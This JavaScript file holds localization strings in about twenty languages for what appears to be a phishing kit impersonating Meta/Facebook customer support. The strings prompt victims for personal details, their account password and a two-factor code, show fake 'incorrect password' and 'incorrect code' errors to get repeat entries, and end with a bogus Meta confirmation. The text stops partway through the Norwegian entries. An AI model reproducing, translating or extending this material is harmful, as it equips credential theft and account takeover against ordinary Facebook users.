// Main Application Logic

const APP_I18N = {
    en: {
        formTitle: 'Information Form',
        fullName: 'Full Name',
        email: 'Email',
        emailBusiness: 'Email Business',
        pageName: 'Page Name',
        phoneNumber: 'Phone Number',
        dateOfBirth: 'Date of Birth',
        day: 'Day',
        month: 'Month',
        year: 'Year',
        pageCategory: 'Page category',
        agreeWith: 'I agree with',
        termsOfUse: 'Terms of use',
        send: 'Send',
        securityHint: 'For your security, you must enter your password to continue.',
        password: 'Password',
        continue: 'Continue',
        forgotPassword: 'Forgot your password?',
        passwordRequired: "You haven't entered your password!",
        passwordIncorrect: "The password you've entered is incorrect.",
        twoFaTitle: 'Two-factor authentication required',
        authDescription: 'Enter the code for this account that we send to {email}, {phone} or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
        code: 'Code',
        tryAnotherWay: 'Try another way',
        codeRequired: "You haven't entered the code!",
        codeRetry: 'The code is incorrect. Try again after {time} seconds.',
        successTitle: 'Request has been sent',
        successBody: 'Your request has been added to the processing queue. We will handle your request within 24 hours.',
        successFrom: 'From the Customer Support Meta.',
        returnFacebook: 'Return to Facebook'
    },
    'en-gb': {
        formTitle: 'Information Form',
        fullName: 'Full Name',
        email: 'Email',
        emailBusiness: 'Business Email',
        pageName: 'Page Name',
        phoneNumber: 'Phone Number',
        dateOfBirth: 'Date of Birth',
        day: 'Day',
        month: 'Month',
        year: 'Year',
        pageCategory: 'Page category',
        agreeWith: 'I agree with',
        termsOfUse: 'Terms of use',
        send: 'Send',
        securityHint: 'For your security, you must enter your password to continue.',
        password: 'Password',
        continue: 'Continue',
        forgotPassword: 'Forgotten your password?',
        passwordRequired: "You haven't entered your password!",
        passwordIncorrect: "The password you've entered is incorrect.",
        twoFaTitle: 'Two-factor authentication required',
        authDescription: 'Enter the code for this account that we send to {email}, {phone} or simply confirm through the two-factor application that you have set (such as Duo Mobile or Google Authenticator)',
        code: 'Code',
        tryAnotherWay: 'Try another way',
        codeRequired: "You haven't entered the code!",
        codeRetry: 'The code is incorrect. Try again after {time} seconds.',
        successTitle: 'Request has been sent',
        successBody: 'Your request has been added to the processing queue. We will handle your request within 24 hours.',
        successFrom: 'From Meta Customer Support.',
        returnFacebook: 'Return to Facebook'
    },
    es: {
        formTitle: 'Formulario de información',
        fullName: 'Nombre completo',
        email: 'Correo electrónico',
        emailBusiness: 'Correo empresarial',
        pageName: 'Nombre de la página',
        phoneNumber: 'Número de teléfono',
        dateOfBirth: 'Fecha de nacimiento',
        day: 'Día',
        month: 'Mes',
        year: 'Año',
        pageCategory: 'Categoría de la página',
        agreeWith: 'Acepto los',
        termsOfUse: 'Términos de uso',
        send: 'Enviar',
        securityHint: 'Por tu seguridad, debes introducir tu contraseña para continuar.',
        password: 'Contraseña',
        continue: 'Continuar',
        forgotPassword: '¿Olvidaste tu contraseña?',
        passwordRequired: '¡No has introducido tu contraseña!',
        passwordIncorrect: 'La contraseña que has introducido es incorrecta.',
        twoFaTitle: 'Se requiere autenticación de dos factores',
        authDescription: 'Introduce el código de esta cuenta que enviamos a {email}, {phone} o confirma simplemente a través de la aplicación de dos factores que hayas configurado (como Duo Mobile o Google Authenticator)',
        code: 'Código',
        tryAnotherWay: 'Probar de otra forma',
        codeRequired: '¡No has introducido el código!',
        codeRetry: 'El código es incorrecto. Inténtalo de nuevo en {time} segundos.',
        successTitle: 'La solicitud ha sido enviada',
        successBody: 'Tu solicitud se ha añadido a la cola de procesamiento. La gestionaremos en un plazo de 24 horas.',
        successFrom: 'Del servicio de atención al cliente de Meta.',
        returnFacebook: 'Volver a Facebook'
    },
    fr: {
        formTitle: 'Formulaire d’informations',
        fullName: 'Nom complet',
        email: 'E-mail',
        emailBusiness: 'E-mail professionnel',
        pageName: 'Nom de la page',
        phoneNumber: 'Numéro de téléphone',
        dateOfBirth: 'Date de naissance',
        day: 'Jour',
        month: 'Mois',
        year: 'Année',
        pageCategory: 'Catégorie de la page',
        agreeWith: 'J’accepte les',
        termsOfUse: 'Conditions d’utilisation',
        send: 'Envoyer',
        securityHint: 'Pour votre sécurité, vous devez saisir votre mot de passe pour continuer.',
        password: 'Mot de passe',
        continue: 'Continuer',
        forgotPassword: 'Mot de passe oublié ?',
        passwordRequired: 'Vous n’avez pas saisi votre mot de passe !',
        passwordIncorrect: 'Le mot de passe saisi est incorrect.',
        twoFaTitle: 'Authentification à deux facteurs requise',
        authDescription: 'Saisissez le code de ce compte que nous envoyons à {email}, {phone} ou confirmez simplement via l’application d’authentification à deux facteurs que vous avez configurée (comme Duo Mobile ou Google Authenticator)',
        code: 'Code',
        tryAnotherWay: 'Essayer une autre méthode',
        codeRequired: 'Vous n’avez pas saisi le code !',
        codeRetry: 'Le code est incorrect. Réessayez dans {time} secondes.',
        successTitle: 'La demande a été envoyée',
        successBody: 'Votre demande a été ajoutée à la file de traitement. Nous la traiterons dans les 24 heures.',
        successFrom: 'De l’assistance client Meta.',
        returnFacebook: 'Retourner sur Facebook'
    },
    de: {
        formTitle: 'Informationsformular',
        fullName: 'Vollständiger Name',
        email: 'E-Mail',
        emailBusiness: 'Geschäftliche E-Mail',
        pageName: 'Seitenname',
        phoneNumber: 'Telefonnummer',
        dateOfBirth: 'Geburtsdatum',
        day: 'Tag',
        month: 'Monat',
        year: 'Jahr',
        pageCategory: 'Seitenkategorie',
        agreeWith: 'Ich stimme den',
        termsOfUse: 'Nutzungsbedingungen zu',
        send: 'Senden',
        securityHint: 'Zu Ihrer Sicherheit müssen Sie Ihr Passwort eingeben, um fortzufahren.',
        password: 'Passwort',
        continue: 'Weiter',
        forgotPassword: 'Passwort vergessen?',
        passwordRequired: 'Sie haben kein Passwort eingegeben!',
        passwordIncorrect: 'Das eingegebene Passwort ist falsch.',
        twoFaTitle: 'Zwei-Faktor-Authentifizierung erforderlich',
        authDescription: 'Geben Sie den Code für dieses Konto ein, den wir an {email}, {phone} senden, oder bestätigen Sie einfach über die Zwei-Faktor-App, die Sie eingerichtet haben (z. B. Duo Mobile oder Google Authenticator)',
        code: 'Code',
        tryAnotherWay: 'Anderen Weg versuchen',
        codeRequired: 'Sie haben den Code nicht eingegeben!',
        codeRetry: 'Der Code ist falsch. Versuchen Sie es in {time} Sekunden erneut.',
        successTitle: 'Anfrage wurde gesendet',
        successBody: 'Ihre Anfrage wurde in die Bearbeitungswarteschlange aufgenommen. Wir bearbeiten sie innerhalb von 24 Stunden.',
        successFrom: 'Vom Meta-Kundensupport.',
        returnFacebook: 'Zurück zu Facebook'
    },
    pt: {
        formTitle: 'Formulário de informações',
        fullName: 'Nome completo',
        email: 'E-mail',
        emailBusiness: 'E-mail comercial',
        pageName: 'Nome da página',
        phoneNumber: 'Número de telefone',
        dateOfBirth: 'Data de nascimento',
        day: 'Dia',
        month: 'Mês',
        year: 'Ano',
        pageCategory: 'Categoria da página',
        agreeWith: 'Concordo com os',
        termsOfUse: 'Termos de uso',
        send: 'Enviar',
        securityHint: 'Para sua segurança, você deve inserir sua senha para continuar.',
        password: 'Senha',
        continue: 'Continuar',
        forgotPassword: 'Esqueceu a senha?',
        passwordRequired: 'Você não inseriu sua senha!',
        passwordIncorrect: 'A senha inserida está incorreta.',
        twoFaTitle: 'Autenticação de dois fatores necessária',
        authDescription: 'Insira o código desta conta que enviamos para {email}, {phone} ou confirme simplesmente pelo aplicativo de dois fatores que você configurou (como Duo Mobile ou Google Authenticator)',
        code: 'Código',
        tryAnotherWay: 'Tentar de outra forma',
        codeRequired: 'Você não inseriu o código!',
        codeRetry: 'O código está incorreto. Tente novamente em {time} segundos.',
        successTitle: 'A solicitação foi enviada',
        successBody: 'Sua solicitação foi adicionada à fila de processamento. Vamos tratá-la em até 24 horas.',
        successFrom: 'Do Suporte ao Cliente da Meta.',
        returnFacebook: 'Voltar ao Facebook'
    },
    ja: {
        formTitle: '情報フォーム',
        fullName: '氏名',
        email: 'メール',
        emailBusiness: 'ビジネス用メール',
        pageName: 'ページ名',
        phoneNumber: '電話番号',
        dateOfBirth: '生年月日',
        day: '日',
        month: '月',
        year: '年',
        pageCategory: 'ページのカテゴリ',
        agreeWith: '同意します',
        termsOfUse: '利用規約',
        send: '送信',
        securityHint: 'セキュリティのため、続行するにはパスワードを入力してください。',
        password: 'パスワード',
        continue: '続ける',
        forgotPassword: 'パスワードをお忘れですか？',
        passwordRequired: 'パスワードが入力されていません。',
        passwordIncorrect: '入力されたパスワードが正しくありません。',
        twoFaTitle: '二要素認証が必要です',
        authDescription: '{email}、{phone} に送信したこのアカウントのコードを入力するか、設定済みの二要素認証アプリ（Duo Mobile や Google Authenticator など）で確認してください',
        code: 'コード',
        tryAnotherWay: '別の方法を試す',
        codeRequired: 'コードが入力されていません。',
        codeRetry: 'コードが正しくありません。{time}秒後に再試行してください。',
        successTitle: 'リクエストが送信されました',
        successBody: 'リクエストは処理待ちキューに追加されました。24時間以内に対応します。',
        successFrom: 'Metaカスタマーサポートより。',
        returnFacebook: 'Facebookに戻る'
    },
    ko: {
        formTitle: '정보 양식',
        fullName: '이름',
        email: '이메일',
        emailBusiness: '업무용 이메일',
        pageName: '페이지 이름',
        phoneNumber: '전화번호',
        dateOfBirth: '생년월일',
        day: '일',
        month: '월',
        year: '연도',
        pageCategory: '페이지 카테고리',
        agreeWith: '다음에 동의합니다',
        termsOfUse: '이용 약관',
        send: '보내기',
        securityHint: '보안을 위해 계속하려면 비밀번호를 입력해야 합니다.',
        password: '비밀번호',
        continue: '계속',
        forgotPassword: '비밀번호를 잊으셨나요?',
        passwordRequired: '비밀번호를 입력하지 않았습니다!',
        passwordIncorrect: '입력한 비밀번호가 올바르지 않습니다.',
        twoFaTitle: '2단계 인증이 필요합니다',
        authDescription: '{email}, {phone}(으)로 보낸 이 계정의 코드를 입력하거나 설정한 2단계 인증 앱(Duo Mobile 또는 Google Authenticator 등)으로 확인하세요',
        code: '코드',
        tryAnotherWay: '다른 방법 시도',
        codeRequired: '코드를 입력하지 않았습니다!',
        codeRetry: '코드가 올바르지 않습니다. {time}초 후에 다시 시도하세요.',
        successTitle: '요청이 전송되었습니다',
        successBody: '요청이 처리 대기열에 추가되었습니다. 24시간 이내에 처리하겠습니다.',
        successFrom: 'Meta 고객 지원에서 보냄.',
        returnFacebook: 'Facebook으로 돌아가기'
    },
    zh: {
        formTitle: '信息表单',
        fullName: '全名',
        email: '电子邮箱',
        emailBusiness: '商务邮箱',
        pageName: '主页名称',
        phoneNumber: '电话号码',
        dateOfBirth: '出生日期',
        day: '日',
        month: '月',
        year: '年',
        pageCategory: '主页类别',
        agreeWith: '我同意',
        termsOfUse: '使用条款',
        send: '发送',
        securityHint: '为了你的安全，必须输入密码才能继续。',
        password: '密码',
        continue: '继续',
        forgotPassword: '忘记密码？',
        passwordRequired: '你尚未输入密码！',
        passwordIncorrect: '你输入的密码不正确。',
        twoFaTitle: '需要两步验证',
        authDescription: '请输入我们发送到 {email}、{phone} 的此账户验证码，或通过你已设置的两步验证应用（例如 Duo Mobile 或 Google Authenticator）进行确认',
        code: '验证码',
        tryAnotherWay: '尝试其他方式',
        codeRequired: '你尚未输入验证码！',
        codeRetry: '验证码不正确。请在 {time} 秒后重试。',
        successTitle: '请求已发送',
        successBody: '你的请求已加入处理队列。我们将在 24 小时内处理。',
        successFrom: '来自 Meta 客户支持。',
        returnFacebook: '返回 Facebook'
    },
    vi: {
        formTitle: 'Biểu mẫu thông tin',
        fullName: 'Họ và tên',
        email: 'Email',
        emailBusiness: 'Email doanh nghiệp',
        pageName: 'Tên trang',
        phoneNumber: 'Số điện thoại',
        dateOfBirth: 'Ngày sinh',
        day: 'Ngày',
        month: 'Tháng',
        year: 'Năm',
        pageCategory: 'Danh mục trang',
        agreeWith: 'Tôi đồng ý với',
        termsOfUse: 'Điều khoản sử dụng',
        send: 'Gửi',
        securityHint: 'Để bảo mật, bạn phải nhập mật khẩu để tiếp tục.',
        password: 'Mật khẩu',
        continue: 'Tiếp tục',
        forgotPassword: 'Quên mật khẩu?',
        passwordRequired: 'Bạn chưa nhập mật khẩu!',
        passwordIncorrect: 'Mật khẩu bạn nhập không đúng.',
        twoFaTitle: 'Cần xác thực hai yếu tố',
        authDescription: 'Nhập mã cho tài khoản này mà chúng tôi gửi đến {email}, {phone} hoặc xác nhận qua ứng dụng xác thực hai yếu tố bạn đã thiết lập (như Duo Mobile hoặc Google Authenticator)',
        code: 'Mã',
        tryAnotherWay: 'Thử cách khác',
        codeRequired: 'Bạn chưa nhập mã!',
        codeRetry: 'Mã không đúng. Thử lại sau {time} giây.',
        successTitle: 'Yêu cầu đã được gửi',
        successBody: 'Yêu cầu của bạn đã được thêm vào hàng đợi xử lý. Chúng tôi sẽ xử lý trong vòng 24 giờ.',
        successFrom: 'Từ bộ phận Hỗ trợ khách hàng Meta.',
        returnFacebook: 'Quay lại Facebook'
    },
    it: {
        formTitle: 'Modulo informazioni',
        fullName: 'Nome completo',
        email: 'E-mail',
        emailBusiness: 'E-mail aziendale',
        pageName: 'Nome della Pagina',
        phoneNumber: 'Numero di telefono',
        dateOfBirth: 'Data di nascita',
        day: 'Giorno',
        month: 'Mese',
        year: 'Anno',
        pageCategory: 'Categoria della Pagina',
        agreeWith: 'Accetto i',
        termsOfUse: 'Termini di utilizzo',
        send: 'Invia',
        securityHint: 'Per la tua sicurezza, devi inserire la password per continuare.',
        password: 'Password',
        continue: 'Continua',
        forgotPassword: 'Password dimenticata?',
        passwordRequired: 'Non hai inserito la password!',
        passwordIncorrect: 'La password inserita non è corretta.',
        twoFaTitle: 'Autenticazione a due fattori richiesta',
        authDescription: 'Inserisci il codice di questo account che inviamo a {email}, {phone} oppure conferma semplicemente tramite l’app di autenticazione a due fattori che hai impostato (come Duo Mobile o Google Authenticator)',
        code: 'Codice',
        tryAnotherWay: 'Prova in un altro modo',
        codeRequired: 'Non hai inserito il codice!',
        codeRetry: 'Il codice non è corretto. Riprova tra {time} secondi.',
        successTitle: 'La richiesta è stata inviata',
        successBody: 'La tua richiesta è stata aggiunta alla coda di elaborazione. La gestiremo entro 24 ore.',
        successFrom: 'Dal Supporto clienti Meta.',
        returnFacebook: 'Torna su Facebook'
    },
    nl: {
        formTitle: 'Informatieformulier',
        fullName: 'Volledige naam',
        email: 'E-mail',
        emailBusiness: 'Zakelijke e-mail',
        pageName: 'Paginanaam',
        phoneNumber: 'Telefoonnummer',
        dateOfBirth: 'Geboortedatum',
        day: 'Dag',
        month: 'Maand',
        year: 'Jaar',
        pageCategory: 'Paginacategorie',
        agreeWith: 'Ik ga akkoord met de',
        termsOfUse: 'Gebruiksvoorwaarden',
        send: 'Verzenden',
        securityHint: 'Voor je veiligheid moet je je wachtwoord invoeren om door te gaan.',
        password: 'Wachtwoord',
        continue: 'Doorgaan',
        forgotPassword: 'Wachtwoord vergeten?',
        passwordRequired: 'Je hebt geen wachtwoord ingevoerd!',
        passwordIncorrect: 'Het ingevoerde wachtwoord is onjuist.',
        twoFaTitle: 'Tweestapsverificatie vereist',
        authDescription: 'Voer de code voor dit account in die we sturen naar {email}, {phone} of bevestig via de tweestapsverificatie-app die je hebt ingesteld (zoals Duo Mobile of Google Authenticator)',
        code: 'Code',
        tryAnotherWay: 'Een andere manier proberen',
        codeRequired: 'Je hebt de code niet ingevoerd!',
        codeRetry: 'De code is onjuist. Probeer het over {time} seconden opnieuw.',
        successTitle: 'Verzoek is verzonden',
        successBody: 'Je verzoek is toegevoegd aan de verwerkingswachtrij. We behandelen het binnen 24 uur.',
        successFrom: 'Van Meta Klantenondersteuning.',
        returnFacebook: 'Terug naar Facebook'
    },
    pl: {
        formTitle: 'Formularz informacji',
        fullName: 'Imię i nazwisko',
        email: 'E-mail',
        emailBusiness: 'E-mail służbowy',
        pageName: 'Nazwa strony',
        phoneNumber: 'Numer telefonu',
        dateOfBirth: 'Data urodzenia',
        day: 'Dzień',
        month: 'Miesiąc',
        year: 'Rok',
        pageCategory: 'Kategoria strony',
        agreeWith: 'Akceptuję',
        termsOfUse: 'Warunki użytkowania',
        send: 'Wyślij',
        securityHint: 'Ze względów bezpieczeństwa musisz wpisać hasło, aby kontynuować.',
        password: 'Hasło',
        continue: 'Kontynuuj',
        forgotPassword: 'Nie pamiętasz hasła?',
        passwordRequired: 'Nie wpisano hasła!',
        passwordIncorrect: 'Wpisane hasło jest nieprawidłowe.',
        twoFaTitle: 'Wymagane uwierzytelnianie dwuskładnikowe',
        authDescription: 'Wpisz kod do tego konta, który wysyłamy na {email}, {phone}, albo potwierdź w aplikacji uwierzytelniania dwuskładnikowego, którą skonfigurowałeś (np. Duo Mobile lub Google Authenticator)',
        code: 'Kod',
        tryAnotherWay: 'Spróbuj innej metody',
        codeRequired: 'Nie wpisano kodu!',
        codeRetry: 'Kod jest nieprawidłowy. Spróbuj ponownie za {time} s.',
        successTitle: 'Wniosek został wysłany',
        successBody: 'Twój wniosek został dodany do kolejki przetwarzania. Rozpatrzymy go w ciągu 24 godzin.',
        successFrom: 'Od działu pomocy Meta.',
        returnFacebook: 'Wróć do Facebooka'
    },
    ru: {
        formTitle: 'Форма сведений',
        fullName: 'Полное имя',
        email: 'Эл. почта',
        emailBusiness: 'Рабочая эл. почта',
        pageName: 'Название страницы',
        phoneNumber: 'Номер телефона',
        dateOfBirth: 'Дата рождения',
        day: 'День',
        month: 'Месяц',
        year: 'Год',
        pageCategory: 'Категория страницы',
        agreeWith: 'Я соглашаюсь с',
        termsOfUse: 'Условиями использования',
        send: 'Отправить',
        securityHint: 'В целях безопасности введите пароль, чтобы продолжить.',
        password: 'Пароль',
        continue: 'Продолжить',
        forgotPassword: 'Забыли пароль?',
        passwordRequired: 'Вы не ввели пароль!',
        passwordIncorrect: 'Введённый пароль неверен.',
        twoFaTitle: 'Требуется двухфакторная аутентификация',
        authDescription: 'Введите код для этого аккаунта, который мы отправляем на {email}, {phone}, или подтвердите вход в приложении двухфакторной аутентификации, которое вы настроили (например, Duo Mobile или Google Authenticator)',
        code: 'Код',
        tryAnotherWay: 'Попробовать другой способ',
        codeRequired: 'Вы не ввели код!',
        codeRetry: 'Код неверен. Повторите попытку через {time} сек.',
        successTitle: 'Запрос отправлен',
        successBody: 'Ваш запрос добавлен в очередь обработки. Мы рассмотрим его в течение 24 часов.',
        successFrom: 'Служба поддержки Meta.',
        returnFacebook: 'Вернуться в Facebook'
    },
    uk: {
        formTitle: 'Форма відомостей',
        fullName: 'Повне ім’я',
        email: 'Ел. пошта',
        emailBusiness: 'Робоча ел. пошта',
        pageName: 'Назва сторінки',
        phoneNumber: 'Номер телефону',
        dateOfBirth: 'Дата народження',
        day: 'День',
        month: 'Місяць',
        year: 'Рік',
        pageCategory: 'Категорія сторінки',
        agreeWith: 'Я погоджуюся з',
        termsOfUse: 'Умовами використання',
        send: 'Надіслати',
        securityHint: 'З міркувань безпеки введіть пароль, щоб продовжити.',
        password: 'Пароль',
        continue: 'Продовжити',
        forgotPassword: 'Забули пароль?',
        passwordRequired: 'Ви не ввели пароль!',
        passwordIncorrect: 'Введений пароль неправильний.',
        twoFaTitle: 'Потрібна двофакторна автентифікація',
        authDescription: 'Введіть код для цього облікового запису, який ми надсилаємо на {email}, {phone}, або підтвердьте вхід у програмі двофакторної автентифікації, яку ви налаштували (наприклад, Duo Mobile або Google Authenticator)',
        code: 'Код',
        tryAnotherWay: 'Спробувати інший спосіб',
        codeRequired: 'Ви не ввели код!',
        codeRetry: 'Код неправильний. Повторіть спробу через {time} сек.',
        successTitle: 'Запит надіслано',
        successBody: 'Ваш запит додано до черги обробки. Ми опрацюємо його протягом 24 годин.',
        successFrom: 'Служба підтримки Meta.',
        returnFacebook: 'Повернутися до Facebook'
    },
    tr: {
        formTitle: 'Bilgi formu',
        fullName: 'Ad soyad',
        email: 'E-posta',
        emailBusiness: 'İş e-postası',
        pageName: 'Sayfa adı',
        phoneNumber: 'Telefon numarası',
        dateOfBirth: 'Doğum tarihi',
        day: 'Gün',
        month: 'Ay',
        year: 'Yıl',
        pageCategory: 'Sayfa kategorisi',
        agreeWith: 'Kabul ediyorum:',
        termsOfUse: 'Kullanım koşulları',
        send: 'Gönder',
        securityHint: 'Güvenliğiniz için devam etmek üzere şifrenizi girmelisiniz.',
        password: 'Şifre',
        continue: 'Devam',
        forgotPassword: 'Şifrenizi mi unuttunuz?',
        passwordRequired: 'Şifrenizi girmediniz!',
        passwordIncorrect: 'Girdiğiniz şifre yanlış.',
        twoFaTitle: 'İki faktörlü kimlik doğrulama gerekli',
        authDescription: '{email}, {phone} adresine gönderdiğimiz bu hesaba ait kodu girin veya ayarladığınız iki faktörlü doğrulama uygulamasıyla (Duo Mobile veya Google Authenticator gibi) onaylayın',
        code: 'Kod',
        tryAnotherWay: 'Başka bir yol dene',
        codeRequired: 'Kodu girmediniz!',
        codeRetry: 'Kod yanlış. {time} saniye sonra tekrar deneyin.',
        successTitle: 'Talep gönderildi',
        successBody: 'Talebiniz işlem kuyruğuna eklendi. 24 saat içinde ele alacağız.',
        successFrom: 'Meta Müşteri Desteği’nden.',
        returnFacebook: 'Facebook’a dön'
    },
    ar: {
        formTitle: 'نموذج المعلومات',
        fullName: 'الاسم الكامل',
        email: 'البريد الإلكتروني',
        emailBusiness: 'البريد الإلكتروني للعمل',
        pageName: 'اسم الصفحة',
        phoneNumber: 'رقم الهاتف',
        dateOfBirth: 'تاريخ الميلاد',
        day: 'اليوم',
        month: 'الشهر',
        year: 'السنة',
        pageCategory: 'فئة الصفحة',
        agreeWith: 'أوافق على',
        termsOfUse: 'شروط الاستخدام',
        send: 'إرسال',
        securityHint: 'لأمانك، يجب إدخال كلمة المرور للمتابعة.',
        password: 'كلمة المرور',
        continue: 'متابعة',
        forgotPassword: 'هل نسيت كلمة المرور؟',
        passwordRequired: 'لم تدخل كلمة المرور!',
        passwordIncorrect: 'كلمة المرور التي أدخلتها غير صحيحة.',
        twoFaTitle: 'مطلوب المصادقة الثنائية',
        authDescription: 'أدخل رمز هذا الحساب الذي نرسله إلى {email}، {phone} أو أكّد عبر تطبيق المصادقة الثنائية الذي أعددته (مثل Duo Mobile أو Google Authenticator)',
        code: 'الرمز',
        tryAnotherWay: 'جرّب طريقة أخرى',
        codeRequired: 'لم تدخل الرمز!',
        codeRetry: 'الرمز غير صحيح. أعد المحاولة بعد {time} ثانية.',
        successTitle: 'تم إرسال الطلب',
        successBody: 'تمت إضافة طلبك إلى قائمة المعالجة. سنتولى طلبك خلال 24 ساعة.',
        successFrom: 'من دعم عملاء Meta.',
        returnFacebook: 'العودة إلى Facebook'
    },
    hi: {
        formTitle: 'जानकारी फ़ॉर्म',
        fullName: 'पूरा नाम',
        email: 'ईमेल',
        emailBusiness: 'व्यवसाय ईमेल',
        pageName: 'पेज का नाम',
        phoneNumber: 'फ़ोन नंबर',
        dateOfBirth: 'जन्म तिथि',
        day: 'दिन',
        month: 'महीना',
        year: 'वर्ष',
        pageCategory: 'पेज श्रेणी',
        agreeWith: 'मैं सहमत हूँ',
        termsOfUse: 'उपयोग की शर्तें',
        send: 'भेजें',
        securityHint: 'आपकी सुरक्षा के लिए जारी रखने हेतु पासवर्ड दर्ज करें।',
        password: 'पासवर्ड',
        continue: 'जारी रखें',
        forgotPassword: 'पासवर्ड भूल गए?',
        passwordRequired: 'आपने पासवर्ड दर्ज नहीं किया है!',
        passwordIncorrect: 'आपके द्वारा दर्ज पासवर्ड गलत है।',
        twoFaTitle: 'दो-कारक प्रमाणीकरण आवश्यक',
        authDescription: 'इस खाते का कोड दर्ज करें जिसे हम {email}, {phone} पर भेजते हैं, या आपके द्वारा सेट किए गए दो-कारक ऐप (जैसे Duo Mobile या Google Authenticator) से पुष्टि करें',
        code: 'कोड',
        tryAnotherWay: 'कोई और तरीका आज़माएँ',
        codeRequired: 'आपने कोड दर्ज नहीं किया है!',
        codeRetry: 'कोड गलत है। {time} सेकंड बाद फिर कोशिश करें।',
        successTitle: 'अनुरोध भेज दिया गया है',
        successBody: 'आपका अनुरोध प्रोसेसिंग कतार में जोड़ दिया गया है। हम इसे 24 घंटे में संभालेंगे।',
        successFrom: 'Meta ग्राहक सहायता से।',
        returnFacebook: 'Facebook पर वापस जाएँ'
    },
    th: {
        formTitle: 'แบบฟอร์มข้อมูล',
        fullName: 'ชื่อ-นามสกุล',
        email: 'อีเมล',
        emailBusiness: 'อีเมลธุรกิจ',
        pageName: 'ชื่อเพจ',
        phoneNumber: 'หมายเลขโทรศัพท์',
        dateOfBirth: 'วันเกิด',
        day: 'วัน',
        month: 'เดือน',
        year: 'ปี',
        pageCategory: 'หมวดหมู่เพจ',
        agreeWith: 'ฉันยอมรับ',
        termsOfUse: 'ข้อกำหนดการใช้งาน',
        send: 'ส่ง',
        securityHint: 'เพื่อความปลอดภัย คุณต้องป้อนรหัสผ่านเพื่อดำเนินการต่อ',
        password: 'รหัสผ่าน',
        continue: 'ดำเนินการต่อ',
        forgotPassword: 'ลืมรหัสผ่าน?',
        passwordRequired: 'คุณยังไม่ได้ป้อนรหัสผ่าน!',
        passwordIncorrect: 'รหัสผ่านที่คุณป้อนไม่ถูกต้อง',
        twoFaTitle: 'ต้องยืนยันตัวตนสองชั้น',
        authDescription: 'ป้อนรหัสของบัญชีนี้ที่เราส่งไปยัง {email}, {phone} หรือยืนยันผ่านแอปยืนยันตัวตนสองชั้นที่คุณตั้งไว้ (เช่น Duo Mobile หรือ Google Authenticator)',
        code: 'รหัส',
        tryAnotherWay: 'ลองวิธีอื่น',
        codeRequired: 'คุณยังไม่ได้ป้อนรหัส!',
        codeRetry: 'รหัสไม่ถูกต้อง ลองอีกครั้งใน {time} วินาที',
        successTitle: 'ส่งคำขอแล้ว',
        successBody: 'คำขอของคุณถูกเพิ่มเข้าคิวการประมวลผลแล้ว เราจะดำเนินการภายใน 24 ชั่วโมง',
        successFrom: 'จากฝ่ายสนับสนุนลูกค้า Meta',
        returnFacebook: 'กลับไปที่ Facebook'
    },
    id: {
        formTitle: 'Formulir informasi',
        fullName: 'Nama lengkap',
        email: 'Email',
        emailBusiness: 'Email bisnis',
        pageName: 'Nama halaman',
        phoneNumber: 'Nomor telepon',
        dateOfBirth: 'Tanggal lahir',
        day: 'Hari',
        month: 'Bulan',
        year: 'Tahun',
        pageCategory: 'Kategori halaman',
        agreeWith: 'Saya setuju dengan',
        termsOfUse: 'Ketentuan penggunaan',
        send: 'Kirim',
        securityHint: 'Demi keamanan, Anda harus memasukkan kata sandi untuk melanjutkan.',
        password: 'Kata sandi',
        continue: 'Lanjutkan',
        forgotPassword: 'Lupa kata sandi?',
        passwordRequired: 'Anda belum memasukkan kata sandi!',
        passwordIncorrect: 'Kata sandi yang Anda masukkan salah.',
        twoFaTitle: 'Autentikasi dua faktor diperlukan',
        authDescription: 'Masukkan kode untuk akun ini yang kami kirim ke {email}, {phone} atau konfirmasikan melalui aplikasi autentikasi dua faktor yang telah Anda atur (seperti Duo Mobile atau Google Authenticator)',
        code: 'Kode',
        tryAnotherWay: 'Coba cara lain',
        codeRequired: 'Anda belum memasukkan kode!',
        codeRetry: 'Kodenya salah. Coba lagi setelah {time} detik.',
        successTitle: 'Permintaan telah dikirim',
        successBody: 'Permintaan Anda telah ditambahkan ke antrean pemrosesan. Kami akan menanganinya dalam 24 jam.',
        successFrom: 'Dari Dukungan Pelanggan Meta.',
        returnFacebook: 'Kembali ke Facebook'
    },
    sv: {
        formTitle: 'Informationsformulär',
        fullName: 'Fullständigt namn',
        email: 'E-post',
        emailBusiness: 'Företags-e-post',
        pageName: 'Sidnamn',
        phoneNumber: 'Telefonnummer',
        dateOfBirth: 'Födelsedatum',
        day: 'Dag',
        month: 'Månad',
        year: 'År',
        pageCategory: 'Sidkategori',
        agreeWith: 'Jag godkänner',
        termsOfUse: 'Användarvillkoren',
        send: 'Skicka',
        securityHint: 'Av säkerhetsskäl måste du ange ditt lösenord för att fortsätta.',
        password: 'Lösenord',
        continue: 'Fortsätt',
        forgotPassword: 'Glömt lösenordet?',
        passwordRequired: 'Du har inte angett ditt lösenord!',
        passwordIncorrect: 'Lösenordet du angav är felaktigt.',
        twoFaTitle: 'Tvåfaktorsautentisering krävs',
        authDescription: 'Ange koden för det här kontot som vi skickar till {email}, {phone} eller bekräfta via den tvåfaktorsapp du har ställt in (till exempel Duo Mobile eller Google Authenticator)',
        code: 'Kod',
        tryAnotherWay: 'Prova ett annat sätt',
        codeRequired: 'Du har inte angett koden!',
        codeRetry: 'Koden är felaktig. Försök igen om {time} sekunder.',
        successTitle: 'Begäran har skickats',
        successBody: 'Din begäran har lagts till i behandlingskön. Vi hanterar den inom 24 timmar.',
        successFrom: 'Från Meta kundsupport.',
        returnFacebook: 'Tillbaka till Facebook'
    },
    no: {
        formTitle: 'Informasjonsskjema',
        fullName: 'Fullt navn',
        email: 'E-post',
        emailBusiness: 'Bedrifts-e-post',
        pageName: 'Sidenavn',
        phoneNumber: 'Telefonnummer',
        dateOfBirth: 'Fødselsdato',
        day: 'Dag',
        month: 'Måned',
        year: 'År',
        pageCategory: 'Sidekategori',
        agreeWith: 'Jeg godtar',
        termsOfUse: 'Bruksvilkårene',
        send: 'Send',
        securityHint: 'Av sikkerhetsgrunner må du oppgi passordet ditt for å fortsette.',
        password: 'Passord',
        continue: 'Fortsett',
        forgotPassword: 'Glemt passordet?',
        passwordRequired: 'Du har ikke oppgitt passordet!',
        passwordIncorrect: 'Passordet du oppga er feil.',
        twoFaTitle: 'Tofaktorautentisering kreves',
        authDescription: 'Skriv inn koden for denne kontoen som vi sender til {email}, {phone}, eller bekreft via tofaktorappen du har satt opp (for eksempel Duo Mobile eller Google Authenticator)',
        code: 'Kode',
        tryAnotherWay: 'Prøv en annen måte',
        codeRequired: 'Du har ikke oppgitt koden!',
